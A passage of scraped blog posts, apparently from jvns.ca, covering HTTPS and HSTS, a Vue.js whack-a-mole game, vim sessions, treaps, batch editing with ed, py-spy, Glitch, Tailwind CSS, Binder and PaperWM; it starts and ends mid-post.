embedded payment form in  this blog post \n(from Gumroad).\nThe payments were definitely made using HTTPS either way (Gumroad\nembedded a secure iframe in my site), so you might think it doesn’t\nmatter if the site is HTTP or HTTPS! \n\n But, if your site has both HTTP and HTTPS content, then users’ browsers\nwill show a “mixed content warning”. \n\n The reason mixed content is bad is – any HTTP content can be interfered\nwith! So if I have a HTTP page with a secure payments thing embedded in\nit, someone could replace the secure payments thing with an Evil Bad\nPayments Thing. That would be no good! If everything on the page is\nHTTPS, then we know it’s all for sure from who it says it is. \n\n The other reason that I find compelling is – sometimes ISPs will inject\nads into sites. I don’t want ads injected into my site! I want people to\nsee my site exactly how I intended them to see it. If my site is always\nserved with HTTPS, I can be confident nobody has done anything sketchy\nto it. \n\n There’s also an argument to be made that  HTTPS can be faster than HTTP \n(for sites that support HTTP/2, which mine does because I use Cloudflare). I don’t actually know\nif my site is faster with HTTPS, but that blog post is really\ninteresting and you should read it. \n\n HSTS: you can’t go back \n\n I use Cloudflare’s free version, and I turned on HSTS with Cloudflare by\nclicking an “Enable HSTS”. Before letting me do it, I had to read the\nfollowing warnings: \n\n \n If you have HSTS enabled and leave Cloudflare, you need to continue to\nsupport HTTPS through a new service provider otherwise your site will\nbecome inaccessible to visitors until you support HTTPS again. \n\n If you turn off Cloudflare’s HTTPS while HSTS is enabled, and you\ndon’t have a valid SSL certificate on your origin server, your website\nwill become inaccessible to visitors. \n \n\n This is kind of scary! Basically browsers will really refuse the visit\nthe HTTP version of your site after you turn on HSTS. So you’d better\nmake sure that you can keep having a HTTPS version of your site forever.\nThis is what the max-age setting is for (I set it to 1 month to start because I\nwas nervous and that was the lowest setting they’d let me use).\nThis is why I didn’t turn on HSTS right away when I first made a HTTPS\nversion for my site. \n\n Luckily, these days anyone can get a free SSL/TLS certificate with  Let’s Encrypt  so even\nif I stop using Cloudflare, I can pretty easily get a TLS\ncertificate for my site and keep providing a secure version. \n\n That said, if you’re gonna turn on HSTS it’s extremely important to make\nsure that you’re prepared to keep serving a secure site indefinitely. \n\n Cloudflare \n\n Technically the fact that my site uses HTTPS doesn’t mean that\neverything on the site is from  me  – Cloudflare actually owns the\nTLS certificate for my site, and they can (and do!) add stuff to my\nwebsite, like a Google analytics code. \n\n I’m okay with this because I trust Cloudflare not to add anything\nevil to my site, but I think it’s still useful to keep in mind. \n\n how can I tell if my site is using the HSTS header properly? \n\n Great question! There’s a site called\n https://observatory.mozilla.org/analyze.html  that you can use to give\nyou a report card! \n\n For example: \n\n \n github:  https://observatory.mozilla.org/analyze.html?host=github.com \n jvns.ca:  https://observatory.mozilla.org/analyze.html?host=jvns.ca \n \n\n You can see that GitHub gets an A+ (yay!) and that I get an F (aw.). I\nthink this is okay because my site doesn’t set any cookies with\nsensitive information, but it kinda makes me feel like I\n should  increase my site’s rating now =). \n\n that’s all! \n\n There are a lot of security headers to know about. Here’s a partial\nlist: \n\n \n Access-Control-Allow-Origin \n Content-Security-Policy \n Strict-Transport-Security \n \n\n I think those three are the most important? \n\n and there’s also \n\n \n Public-Key-Pins \n X-Content-Type-Options \n X-Frame-Options \n X-XSS-Protection \n … and more! \n \n\n The  Mozilla Web Security Guidelines \nlooks to me like a good reference if you want to understand what some\nspecific header does. \n\n"},
{"url": "https://jvns.ca/blog/2017/06/26/vue-js-fun/", "title": "a tiny whack-a-mole game", "content": "\n     \n\n \n\n Hello! The other day I was learning about  vue.js  and I\nthought it was kind of fun so I made this whack-a-mole game\n( jsfiddle ).  (if you’re reading this in RSS /\nemail you should maybe click on the post to see the game). \n\n Rules : \n\n \n moles are orange. click them to whack them \n if you whack all the moles you win \n \n\n Here, you can play it: \n\n \n \n   \n     YOU WIN!!!\n   \n   \n     \n       \n         \n       \n     \n   \n \n \n\n To make this game work I needed to: \n\n \n make event handlers that whack the mole when I click on an orange mole \n make the game disappear when the player wins \n automatically add new moles every 0.5 seconds to be whacked \n \n\n Usually when I write Javascript I use jQuery and make a lot of callbacks and\nthe code I write is sort of a disaster. \n\n I’m excited about vue.js right now because it feels like an easier way to make\ntiny interactive javascript programs like this one. \n\n Here is the display logic for this game! It is pretty simple! There is some\nHTML and it only displays the table if the game is still going ( !won() ). \n\n The thing I like about this is – I just need to define a data structure for my\ngame state ( mole_grid ). Each entry in that grid is 1 if there’s a mole there\nan 0 if there’s no mole. Vue.js automatically takes care of updating the HTML\nwhen my game state updates. This is also how React works but vue seems less\ncomplicated to me than React and I only want to do simple things anyway. \n\n \n \n   \n     YOU WIN!!!\n   \n   \n     \n       \n         \n       \n     \n   \n \n \n.circle {\n  border-radius: 50%;\n  width: 50px;\n  height: 50px;\n  /* width and height can be anything, as long as they&rsquo;re equal */\n}\n</xmp></p>\n\n<h3 id=\"javascript\">javascript</h3>\n\n<p>Okay, but the app needs, like, callbacks and Javascript and stuff. Here&rsquo;s all\nthe javascript! It has a <code>squash</code> function and a <code>won</code> function. It feels about\nas simple as the code for a whack-a-mole game should be which is.. pretty\nsimple.</p>\n\n<pre><code class=\"language-javascript\">var app = new Vue({\n  el: '#app',\n  data: {\n    mole_grid: [ // this is the initial grid, with 2 moles on it\n                 // all the game state is here basically!\n      [0, 1, 0],\n      [0, 0, 0],\n      [1, 0, 1]\n    ],\n    has_won: false, // also store if the player won yet\n  },\n  methods: {\n    set_mole: function(x_coord, y_coord, value) {\n      this.mole_grid[x_coord][y_coord] = value;\n      Vue.set(this.mole_grid, x_coord, this.mole_grid[x_coord]);\n    },\n    squash: function(x_coord, y_coord) {\n      this.set_mole(x_coord, y_coord, 0);\n    },\n    // check if we won yet\n    won: function () {\n    \tif (this.has_won) {\n      \treturn true\n      }\n      var sum = 0;\n      for (var i in this.mole_grid) {\n      \tfor (var j in this.mole_grid[i]) {\n        \tsum += parseInt(this.mole_grid[i][j]);\n        }\n      }\n      if (sum == 0) {\n      \tthis.has_won = true;\n      }\n      return this.has_won;\n    }\n  }\n})\n\nfunction getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min)) + min;\n}\n\n// add a new mole to squash every 500ms\nsetInterval(function() {\nconsole.log(app.won());\n  app.set_mole(getRandomInt(0, app.mole_grid.length), getRandomInt(0, app.mole_grid[0].length), 1)\n}, 500);\n\n</code></pre>\n\n<script type=\"text/javascript\">\n\nvar app = new Vue({\n  el: '#app',\n  data: {\n    mole_grid: [\n      [0, 1, 0],\n      [0, 0, 0],\n      [1, 0, 1]\n    ],\n    has_won: false,\n  },\n  methods: {\n    set_mole: function(x_coord, y_coord, value) {\n      this.mole_grid[x_coord][y_coord] = value;\n      Vue.set(this.mole_grid, x_coord, this.mole_grid[x_coord]);\n    },\n    squash: function(x_coord, y_coord) {\n      this.set_mole(x_coord, y_coord, 0);\n    },\n    won: function () {\n        if (this.has_won) {\n        return true\n      }\n        var sum = 0;\n      for (var i in this.mole_grid) {\n        for (var j in this.mole_grid[i]) {\n            sum += parseInt(this.mole_grid[i][j]);\n        }\n      }\n      if (sum == 0) {\n        this.has_won = true;\n      }\n      return this.has_won;\n    }\n  }\n})\n\nfunction getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min)) + min;\n}\n\nsetInterval(function() {\nconsole.log(app.won());\n  app.set_mole(getRandomInt(0, app.mole_grid.length), getRandomInt(0, app.mole_grid[0].length), 1)\n}, 500);\n\napp.squash(0, 1)\n</script>\n\n<style type=\"text/css\">\n.circle {\n  border-radius: 50%;\n  width: 50px;\n  height: 50px;\n  /* width and height can be anything, as long as they're equal */\n}\n \n\n that’s all \n\n I don’t have a lot of opinions about javascript libraries (my local npm\ninstallation is definitely broken), but I do like to make tiny interactive\nwebpages on the internet occasionally and this seems like a nice way to do\nthat. \n\n \n\n \n\n \n  #mc_embed_signup{background:#fff; clear:left; font:14px Helvetica,Arial,sans-serif; display: inline;}\n  #mc_embed_signup  {\n    display: inline;\n  }\n  #mc_embed_signup input.button {\n    background: #ff5e00;\n    display: inline;\n    color: white;\n    padding: 6px 12px;\n  }\n \n \n\n \n    .form-inline {\n        display:flex; flex-flow: row wrap; justify-content: center;\n    }\n    .form-inline input,span {\n        padding: 10px;\n    }\n    .form-inline input {\n        display:inline;\n        max-width:30%; \n        margin: 0 10px 0 0; \n        background-color: #fff;\n        border: 1px solid #ddd;\n        border-radius: 5px;\n        padding: 10px;\n    }\n    button {\n        background-color: #f50;\n        box-shadow: none;\n        border: 0;\n        border-radius: 5px;\n        color: white;\n        padding: 5px 10px;\n    }\n    @media (max-width: 800px) {\n        .form-inline input {\n            margin: 10px 0;\n            max-width:100% !important;\n        }\n        .form-inline {\n            flex-direction: column;\n            align-items: stretch;\n        }\n    }\n \n\n \n     \n          Want a weekly digest of this blog? \n          \n         Subscribe \n     \n \n\n\n \n\n \n   \n     What can developers learn from being on call? \n  \n   \n     3 short screencasts (/proc, tcpdump, strace) \n  \n \n \n\n\n"},
{"url": "https://jvns.ca/blog/2017/09/10/vim-sessions/", "title": "Cool vim feature: sessions!", "content": "\n      Yesterday I learned about an awesome vim feature while working on my\n vimrc ! (to add fzf & ripgrep search plugins\nmainly). It’s a builtin feature, no fancy plugins needed. \n\n So I drew a comic about it. \n\n Basically you can save all your open files and current state with \n\n :mksession ~/.vim/sessions/foo.vim\n \n\n and then later restore it with either  :source ~/.vim/sessions/foo.vim  or  vim -S ~/.vim/sessions/foo.vim . Super cool! \n\n Some vim plugins that add extra features to vim sessions: \n\n \n https://github.com/tpope/vim-obsession \n https://github.com/mhinz/vim-startify \n https://github.com/xolox/vim-session \n \n\n Here’s the comic: \n\n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2017/09/09/data-structure--the-treap-/", "title": "Data structure: the treap!", "content": "\n      Here’s a quick sketch I did yesterday about a randomized data structure: the\n treap .  It’s basically a really cool way to implement a\nbalanced binary search tree. Kamal told me about it! \n\n The main reason I know for sure this is useful is in case someone asks you to implement a balanced\nbinary search tree in an interview. More seriously though – if you want to implement an ordered map\n(like C++’s  std::map ), then you probably want a\nbalanced BST! \n\n C++’s std::map is usually a red-black tree, but a treap performs just as well (in expected value)\nand the algorithms for insert/delete are way simpler. \n\n \n \n \n \n \n\n"},
{"url": "https://jvns.ca/blog/2018/05/11/batch-editing-files-with-ed/", "title": "Batch editing files with ed", "content": "\n     \n\n The other day at work I needed to edit 200 files at once. I wanted to do something pretty simple:\nbasically, I had files that looked like this: \n\n foo:\n  - bar\n  - baz\n  - bananas\n \n\n and I wanted to insert an extra line after the  baz  line that said  elephant \n\n foo:\n  - bar\n  - baz\n  - elephant\n  - bananas\n \n\n I had one extra weird requirement which was that some of the lines were indented with 2 spaces, and\nsome with 4 spaces. The  - elephant  line needed to have the same indentation as the previous line. \n\n I didn’t feel like writing a program to do this (perl would be perfect, but I don’t really remember\nperl at all), so I wanted to use a command line tool! A vim macro could do it, but how do you save a\nvim macro to a file again? I forget! I couldn’t think of how to do it with sed at the time, though\nin retrospect you could do something like  s/(.+)- baz/\\1- baz\\n\\1- elephant . \n\n In a surprising turn of events, I ended up using the  ed  editor to do this task, and it was really\neasy and simple to do! In this blog post I’ll make the case that if you have something you might\nnormally accomplish with a Vim macro, you might conceivably want to use Ed for it! \n\n what’s ‘ed’? \n\n ed  is this sort of terrifying text editor. A typical interaction with  ed  for me in the past has\ngone something like this: \n\n $ ed\nhelp\n?\nh\n?\nasdfasdfasdfsadf\n?\n<close terminal in frustration>\n \n\n Basically if you do something wrong, ed will just print out a single, unhelpful,  ? . So I’d\nbasically dismissed  ed  as an old arcane Unix tool that had no practical use today. \n\n vi  is a successor to  ed , except with a visual interface instead of this  ? \n\n surprise: Ed is actually sort of cool and fun \n\n So if Ed is a terrifying thing that only prints  ?  at you, why am I writing a blog post about it?\nWELL!!!! \n\n On April 1 this year, Michael W Lucas published a new short book\ncalled  Ed Mastery . I like his writing, and even though it\nwas sort of an april fool’s joke, it was ALSO a legitimate actual real book, and so I bought it and\nread it to see if his claims that Ed is actually interesting were true. \n\n And it was so cool!!!! I found out: \n\n \n how to get Ed to give you better error messages than just  ? \n that the name of the  grep  command comes from ed syntax ( g/re/p ) \n the basics of how to navigate and edit files using ed \n \n\n All of that was a cool Unix history lesson, but did not make me want to actually use Ed in real\nlife. But!!! \n\n The other neat thing about Ed (that did make me want to use it!) is that any Ed session corresponds to a script that you can replay! So\nif I know Ed, then I can use Ed basically as a way to easily apply vim-macro-like programs to my\nfiles. \n\n how I solved my problem with ed \n\n So! we have a file like this: \n\n foo:\n  - bar\n  - baz\n  - bananas\n \n\n and we want to add a line after  - baz  that says  - elephant . Let’s do it!! \n\n With Vim, I’d do it by: \n\n \n search for  baz \n copy that line and paste it \n s/baz/elephant \n save & quit \n \n\n We can translate that into an Ed script in a really pretty straightforward way!! \n\n /baz                 # search for `baz`\n.t.                  # copy that line and paste it on the next line\ns/baz/elephants      # on the second, pasted, line replace `baz` with `elephants`\nw                    # save\nq                    # quit\n \n\n ed doesn’t actually have comments, so if you wanted to actually run this ed script you’ll have to\nremove the  #  things \n\n Most of this is very similar to what you’d do in Vim – the  .t.  part of this is the most\ninscrutable bit, but I figured it out through some judicious use of Stack Overflow. \n\n using the ed script \n\n Applying the ed script to the file I want to edit is easy! Here’s how; \n\n cat my-script.ed | ed file-to-edit.txt\n \n\n (or you could write  ed file-to-edit.txt < my-script.ed , but I always use cat and pipe in practice :) ) \n\n Ed is at least a little bit useful!!!! \n\n It was super surprising and delightful to me to find a practical use for Ed! To me the most\ncompelling thing about Ed is that I use simple Vim macros a lot, and it’s a pretty direct way to\ntranslate a Vim macro into a way to batch edit a bunch of files. \n\n I’m definitely not going to go telling everyone they should be using ed (it’s certainly not very\nuser friendly!), but I think it’s neat. If\nyou’re interested, I’d really recommend buying  Ed Mastery  – it’s quite short, I learned some neat Unix\nhistory from it, and now I have a new tool to use very occasionally!! \n\n"},
{"url": "https://jvns.ca/blog/2018/09/08/an-awesome-new-python-profiler--py-spy-/", "title": "An awesome new Python profiler: py-spy!", "content": "\n     \n\n The other day I learned that  Ben Frederickson  has written an awesome new Python profiler\ncalled  py-spy ! \n\n It takes a similar approach to profiling as  rbspy , the profiler I worked\non earlier this year – it can profile any running Python program, it uses process_vm_readv to read\nmemory, and it by default displays profiling information in a really easy-to-use way. \n\n Obviously, think this is SO COOL. Here’s what it looks like profiling a Python program: (gif taken\nfrom the github README) \n\n \n\n It has this great top-like output by default. The default UI is somewhat similar to rbspy’s, but\nfeels better executed to me :) \n\n you can install it with pip! \n\n Another thing he’s done that’s really nice is make it installable with  pip  – you can run  pip install\npy-spy  and have it download a binary immediately! This is cool because, even though  py-spy  is a\nRust program, obviously Python programmers are used to installing software with  pip  and not\n cargo . \n\n In  the README  he describes what he had to do to distribute a\nRust executable with pip without requiring that users have a Rust compiler installed. \n\n pyspy probably is more stable than rbspy! \n\n Another nice thing  py-spy  is that I believe it only uses Python’s public\nbindings (eg  Python.h ). What I mean by “public bindings” is the header files you’d find in\n libpython-dev . \n\n rbspy by contrast uses a bunch of header files from inside the Ruby interpreter. This is because\nPython for whatever reason includes a lot more struct definitions in its header files. \n\n As a result, if you compare py-spy’s  python bindings  to rbspy’s  ruby bindings , you’ll notice that \n\n \n there are way fewer Python binding files (6 vs 42 for Ruby) \n each file is much smaller (~30kb vs 200kb for Ruby) \n \n\n Basically what I think this means is that py-spy is likely to be easier to maintain longterm than\nrbspy – since rbspy depends on unstable internal Ruby interfaces, even though it works relatively\nwell today, future versions of Ruby could break it at any time. \n\n the start of an ecosystem of profilers in Rust?? :) \n\n One thing that I think is super nice is that rbspy & py-spy share some code! There’s this\n proc-maps  crate that Ben extracted from rbspy and improved\nsubstantially. I think this is awesome because if someone wants to make a py-spy/rbspy-like profiler\nin Rust for another language like Perl or Javascript or something, it’s even easier! \n\n It turns out that  phpspy  is a sampling profiler for PHP, too! \n\n I have this secret dream that we could eventually have a suite of open source profilers for lots of\ndifferent programming languages that all have similar user interfaces. Today every single profiling\ntool is different and it’s a pain. \n\n also rbspy has windows support now! \n\n Ben also contributed Windows support to  rbspy , which was amazing,\nand py-spy has Windows support from the start. \n\n So if you want to profile Ruby or Python programs on Windows, you can! \n\n"},
{"url": "https://jvns.ca/blog/2017/11/13/glitch--write-small-web-projects-easily/", "title": "Glitch: write fun small web projects instantly", "content": "\n     \n\n I just wrote about Jupyter Notebooks which are a fun interactive way to write Python code. That\nreminded me I learned about Glitch recently, which I also love!! I built a small app to  turn of twitter retweets  with it. So! \n\n Glitch  is an easy way to make Javascript webapps. (javascript backend,\njavascript frontend) \n\n The fun thing about glitch is: \n\n \n you start typing Javascript code into their web interface \n as soon as you type something, it automagically reloads the backend of your website with the new\ncode. You don’t even have to save!! It autosaves. \n \n\n So it’s like Heroku, but even more magical!! Coding like this (you type, and the code runs on\nthe public internet immediately) just feels really  fun  to me. \n\n It’s kind of like sshing into a server and editing PHP/HTML code on your server and having it\ninstantly available, which I kind of also loved. Now we have “better deployment practices” than\n“just edit the code and it is instantly on the internet” but we are not talking about Serious\nDevelopment Practices, we are talking about writing tiny programs for fun. \n\n glitch has awesome example apps \n\n Glitch seems like fun nice way to learn programming! \n\n For example, there’s a space invaders game (code by  Mary Rose Cook ) at  https://space-invaders.glitch.me/ . The thing I love about this is that in just a few clicks I can \n\n \n click “remix this” \n start editing the code to make the boxes orange instead of black \n have my own space invaders game!! Mine is at  http://julias-space-invaders.glitch.me/ . (i just\nmade very tiny edits to make it orange, nothing fancy) \n \n\n They have tons of example apps that you can start from – for instance\n bots ,  games , and more. \n\n awesome actually useful app: tweetstorms \n\n The way I learned about Glitch was from this app which shows you tweetstorms from a given user:  https://tweetstorms.glitch.me/ . \n\n For example, you can see  @sarahmei ’s tweetstorms at  https://tweetstorms.glitch.me/sarahmei  (she\ntweets a lot of good tweetstorms!). \n\n my glitch app: turn off retweets \n\n When I learned about Glitch I wanted to turn off retweets for everyone I follow on Twitter (I know\nyou can do it in Tweetdeck!) and doing it manually was a pain – I had to do it one person at a\ntime. So I wrote a tiny Glitch app to do it for me! \n\n I liked that I didn’t have to set up a local development environment, I could just start typing and\ngo! \n\n Glitch only supports Javascript and I don’t really know Javascript that well (I think I’ve never\nwritten a Node program before), so the code isn’t awesome. But I had a really good time writing it\n– being able to type and just see my code running instantly was delightful. Here it is:\n https://turn-off-retweets.glitch.me/ . \n\n that’s all! \n\n Using Glitch feels really fun and democratic. Usually if I want to fork someone’s web project and\nmake changes I wouldn’t do it – I’d have to fork it, figure out hosting, set up a local dev\nenvironment or Heroku or whatever, install the dependencies, etc. I think tasks like installing\nnode.js dependencies used to be interesting, like “cool i am learning something new” and now I just\nfind them tedious. \n\n So I love being able to just click “remix this!” and have my version on the internet instantly. \n\n"},
{"url": "https://jvns.ca/blog/2018/11/01/tailwind--write-css-without-the-css/", "title": "Tailwind: style your site without writing any CSS!", "content": "\n     \n\n Hello! Over the last couple of days I put together a new website for my zines\n( https://wizardzines.com ). To make this website, I needed to write HTML and CSS. Eep!! \n\n Web design really isn’t my strong suit. I’ve been writing mediocre HTML/CSS for probably like 12\nyears now, and since I don’t do it at all in my job and am making no efforts to improve, the chances\nof my mediocre CSS skills magically improving are… not good. \n\n But! I want to make websites sometimes, and It’s 2018! All websites need to be responsive! So even\nif I make a pretty minimalist site, it does need to at least sort of work on phones and tablets and\ndesktops with lots of different screen sizes. I know about CSS and flexboxes and media queries,\nbut in practice putting all of those things together is usually a huge pain. \n\n I ended up making this site with  Tailwind CSS , and\nit helped me make a site I felt pretty happy with my minimal CSS skills and just 2 evenings of work! \n\n The Tailwind author wrote a blog post called  CSS Utility Classes and “Separation of Concerns”  which you should very possibly read instead of this :). \n\n CSS zen garden: change your CSS, not your HTML \n\n Until yesterday, what I believed about writing good CSS was living in about 2003 with the  CSS zen\ngarden . The CSS zen garden was (and is! it’s still up!) this site\nwhich was like “hey everyone!! you can use CSS to style your websites instead of HTML tables! Just\nwrite nice semantic HTML and then you can accomplish anything you need to do with CSS! This is\namazing!” They show it off by providing  lots   of   different  designs for the site, which all use exactly the same HTML. It’s a really fun & creative thing and it obviously made an impression because I remember it like 10 years later. \n\n And it makes sense! The idea that you should write semantic HTML, kind of like this: \n\n div class=\"zen-resources\" id=\"zen-resources\">\n   <h3 class=\"resources\">Resources:</h3>\n \n\n and then style those classes. \n\n writing CSS is not actually working for me \n\n Even though I believe in this CSS zen garden semantic HTML ideal, I feel like writing CSS is not\nactually really working for me personally. I know some CSS basics – I know  font-size  and  align \nand  min-height  and can even sort of use flexboxes and CSS grid. I can mostly center things. I made\n https://rbspy.github.io/  responsive by writing CSS. \n\n But I only write CSS probably every 4 months or something, and only for tiny personal sites, and in\npractice I always end up with some media query problem sadly googling “how do I center div” for the\n500th time. And everything ends up kind of poorly aligned and eventually I get something that sort\nof works and hide under the bed. \n\n CSS frameworks where you don’t write CSS \n\n So! There’s this interesting thing that has happened where now there are CSS frameworks where you\ndon’t actually write any CSS at all to use them! Instead, you just add lots of CSS classes to each\nelement to style it. It’s basically the opposite of the CSS zen garden – you have a single CSS file\nthat you don’t change, and then you use 10 billion classes in your HTML to style your site. \n\n Here’s an example from  https://wizardzines.com/zines/manager/ . This snippet puts images of the cover\nand the table of contents side by side. \n\n <div class=\"flex flex-row flex-wrap justify-center\">\n  <div class=\"md:w-1/2 md:pr-4\">\n    <img src='cover.png'>\n  </div>\n  \n  <div class=\"md:w-1/2\">\n    <a class=\"outline-none\" href='/zines/manager/toc.png'>\n    <img src='toc.png'>\n   \t</a>  \n  </div>\n</div>\n \n\n Basically the outside div is a flexbox –  flex  means  display: flex ,  flex-row  means\n flex-direction: row , etc. Most (all?) of the classes apply exactly 1 line of CSS. \n\n Here’s the ‘Buy’ Button: \n\n <a class=\"text-xl rounded bg-orange pt-1 pb-1 pr-4 pl-4 text-white hover:text-white no-underline leading-loose\" href=\"https://wizardzines.com/zines/oh-shit-git\">Buy for $10</a>\n \n\n The Buy button breaks down as: \n\n \n pt, pb, pr, pl  are padding \n text-white, hover:text-white  are the text color \n no-underline  is  text-decoration: none \n leading-loose  sets  line-height: 1.5 \n \n\n why it’s fun: easy media queries \n\n Tailwind does a really nice thing with media queries, where if you add a class  lg:pl-4 , it means\n“add padding, but only on screens that are ‘large’ or bigger. \n\n I love this because it’s really easy to experiment and I don’t need to go hunt through my media\nqueries to make something look better on a different screen size! For example, for that image\nexample above, I wanted to make the images display side by side, but only on biggish screens. So I\ncould just add the class  md:w-1/2 , which makes the width 50% on screens bigger than ‘medium’. \n\n   <div class=\"md:w-1/2 md:pr-4\">\n    <img src='cover.png'>\n  </div>\n \n\n Basically there’s CSS in Tailwind something like: \n\n @media screen and (min-width: 800px) {\n    .md:w-1/2 {\n        width: 50%;\n    }\n}\n \n\n I thought it was interesting that all of the Tailwind media queries seem to be expressed in terms of\n min-width  instead of  max-width . It seems to work out okay. \n\n why it’s fun: it’s fast to iterate! \n\n Usually when I write CSS I try to add classes in a vaguely semantic way to my code, style them with\nCSS, realize I made the wrong classes, and eventually end up with weird divs with the id\n“WRAPPER-WRAPPER-THING” or something in a desperate attempt to make something centered. \n\n It feels incredibly freeing to not have to give any of my divs styles or IDs at all and just focus\non thinking about how they should look. I just have one kind of thing to edit!  (the HTML). So if I\nwant to add some padding on the left, I can just add a  pl-2  class, and it’s done! \n\n https://wizardzines.com/  has basically no CSS at all except for a single  <link href=\"https://cdn.jsdelivr.net/npm/tailwindcss/dist/tailwind.min.css\" rel=\"stylesheet\"> . \n\n why is this different from inline styles? \n\n These CSS frameworks are a little weird because adding the  no-underline  class is literally the\nsame as writing an inline  text-decoration: none . So is this just basically equivalent to using\ninline CSS styles? It’s not! Here are a few extra features it has: \n\n \n media queries. being able to specify alternate attributes depending on the size ( sm:text-orange md:text-white ) is awesome to be able to do so quickly \n Limits & standards. With normal CSS, I can make any element any width I want. For me, this is not a good thing! With tailwind, there are only  30ish options for width , and I found that these limits made me way easier for me to make reasonable CSS choices that made my site look the way I wanted. No more  width: 300px; /* i hope this looks okay i don't know help */  Here’s the  colour palette ! It forces you to do everything in  em  instead of using pixels which I understand is a Good Idea even though I never actually do it when writing CSS. \n \n\n why does it make sense to use CSS this way? \n\n It seems like there are some other trends in web development that make this approach to CSS make\nmore sense than it might have in, say, 2003. \n\n I wonder if the reason this approach makes more sense now is that we’re doing more generation of\nHTML than we were in 2003. In my tiny example, this approach to CSS actually doesn’t introduce\n that  much duplication into my site, because all of the HTML is generated by Hugo templates, so most\nstyles only end up being specified once anyway. So even though I need to write this absurd  text-xl\nrounded bg-orange pt-1 pb-1 pr-4 pl-4 text-white hover:text-white no-underline leading-loose  set of\nclasses to make a button, I only really need to write it once. \n\n I’m not sure! \n\n other similar CSS frameworks \n\n \n tachyons \n bulma \n tailwind \n to some extent the much older  bootstrap , though when I’ve used that I\nultimately felt like all my sites looked exactly the same (“oh, another bootstrap site”), which\nmade me stop using it. \n \n\n There are probably lots more. I haven’t tried Tachyons or Bulma at all. They look nice too. \n\n utility-first, not utility-only \n\n Tne thing the Tailwind author says that I think is interesting is that the goal of Tailwind is not\nactually for you to  never  write CSS (even though obviously you can get away with that for small\nsites). There’s some more about that in  these HN comments . \n\n should everyone use this? no idea \n\n I have no position on the One True Way to write (or not write) CSS. I’m not a frontend developer and\nyou definitely should not take advice from me. But I found this a lot easier than just about\neverything I’ve tried previously, so maybe it will help you too. \n\n"},
{"url": "https://jvns.ca/blog/2017/11/12/binder--an-awesome-tool-for-hosting-jupyter-notebooks/", "title": "Binder: an awesome tool for hosting Jupyter notebooks", "content": "\n     \n\n Thanks to a  pull request  today, I learned about\na thing called Binder!!  https://mybinder.org/ . \n\n Binder is a tool that lets other people easily launch an interactive copy of your Jupyter notebooks.\nI am SO STOKED that this exists, I have wanted it forever. \n\n Here’s my  pandas cookbook on Binder .\nYou’ll need to wait for it to load and click ‘cookbook’ to try it out. \n\n what’s a Jupyter notebook? \n\n Jupyter notebooks (formerly called IPython notebooks) are an awesome way to combine code and text\nand images into an interactive document. I especially love them for doing data analysis – it’s\nbasically life changing. \n\n Here’s an  example notebook analyzing some Montreal bike path data I made in 2013 . You can see both the code, some explanations, and the output of the code all in one place!! \n\n jupyter notebooks are easy to share online \n\n If you want to share a Jupyter notebook on the internet, it’s super super easy (I just did it\nabove!). There are at least 2 different services you can use (github and nbviewer) \n\n \n post a link to it on GitHub  https://github.com/jvns/talks/blob/master/2013-04-mtlpy/pistes-cyclables.ipynb . Github has a built-in renderer for jupyter notebooks which is GREAT. \n Put it on GitHub and use  https://nbviewer.jupyter.org  to share it  https://nbviewer.jupyter.org/github/jvns/talks/blob/master/2013-04-mtlpy/pistes-cyclables.ipynb \n \n\n nbviewer and github have both done this for a long time. This is great. But nbviewer isn’t\ninteractive – it shows you a read-only version. So you can’t edit the code and experiment! \n\n sharing interactive copies is important! \n\n I used to occasionally run free Python intro data science workshops: we’d install pandas + the\nJupyter notebook, do some fun data analysis, learn the basics. Here’s how it would go: \n\n \n write a bunch of materials before the workshop \n try to write really good installation instructions in advance \n go to the workshop. Someone is running Windows and I didn’t prepare for that \n struggle through installation with everyone and mostly survive \n \n\n Having to install a bunch of software really sucks when you’re trying to get started with a new\nthing. And getting the scientific Python stack set up can be a pain (though tools like Anaconda\ndefinitely made it a lot easier) \n\n Today there’s actually software designed for exactly this use case – you can set up\n JupyterHub   on a server and have your workshop\nattendees sign into it. This didn’t exist when I was running workshops but it exists now and it\nlooks awesome. You still need to set up the server which is nontrivial but that seems way better\nthan supporting 30 people through installation issues. \n\n binder = amazing \n\n Binder  lets you easily host interactive Jupyter notebooks and let anyone on\nthe internet use them interactively immediately! It uses JupyterHub under the hood. \n\n If you want to try it out, you can do that right now: \n\n \n Go to  https://mybinder.org/v2/gh/jvns/pandas-cookbook/master  (which will launch the\ngithub.com/jvns/pandas-cookbook repository) \n Wait for it to build and click ‘launch’ \n click ‘cookbook’, click a notebook, and play around! There’s an “A quick tour of the IPython\nNotebook” notebook which shows off some of the basic features. \n \n\n It apparently uses Kubernetes + Docker under the hood which is interesting! It must be much much\nmore expensive to run than the read-only services, but it’s such a useful and cool thing!  I hope it\ncontinues to exist. \n\n There’s also the  colaboratory  by Google which is kinda the same\nthing, but it doesn’t work with github and only supports Chrome so it is less exciting to me. But\nstill cool! \n\n"},
{"url": "https://jvns.ca/blog/2020/01/05/paperwm/", "title": "PaperWM: tiled window management for GNOME", "content": "\n     \n\n When I started using Linux on my personal computer, one of the first things I got excited\nabout was tiny lightweight window managers, largely because my laptop at the time\nhad 32MB of RAM and anything else was unusable. \n\n Then I got into tiling window managers like  xmonad ! I\ncould manage my windows with my keyboard! They were so fast! I could configure\nxmonad by writing a Haskell program! I could customize everything in all kinds\nof fun ways (like using  dmenu  as\na launcher)! I used 3 or 4 different tiling window managers over the years and\nit was fun. \n\n About 6 years ago I decided configuring my tiling window manager wasn’t fun for\nme anymore and switched to using the Ubuntu stock desktop environment: Gnome.\n(which is much faster now that I have 500x more RAM in my laptop :) ) \n\n So I’ve been using Gnome for a long time, but I still kind of missed tiling\nwindow managers. Then 6 months ago a friend told me about  PaperWM , which lets you tile\nyour windows in Gnome! I installed it immediately and I’ve been using it ever\nsince. \n\n PaperWM: tiling window management for Gnome \n\n The basic idea of  PaperWM  is: you want to\nkeep using Gnome (because all kinds of things Just Work in Gnome) but you also\nkinda wish you were using a tiling window manager. \n\n It’s a Gnome extension (instead of being a standalone window manager) and it’s\nin Javascript. \n\n “Paper” means all of your windows are in a line \n\n The main idea in PaperWM is it puts all your windows in a line, which is\nactually quite different from traditional tiling window managers where you can\ntile your windows any way you want. Here’s a gif of me moving between /\nresizing some windows while writing this blog post (there’s a browser and two\nterminal windows): \n\n \n \n \n\n PaperWM’s Github README links to this video:  http://10gui.com/video/ , which\ndescribes a similar system as a “linear window manager”. \n\n I’d never heard of this way of organizing 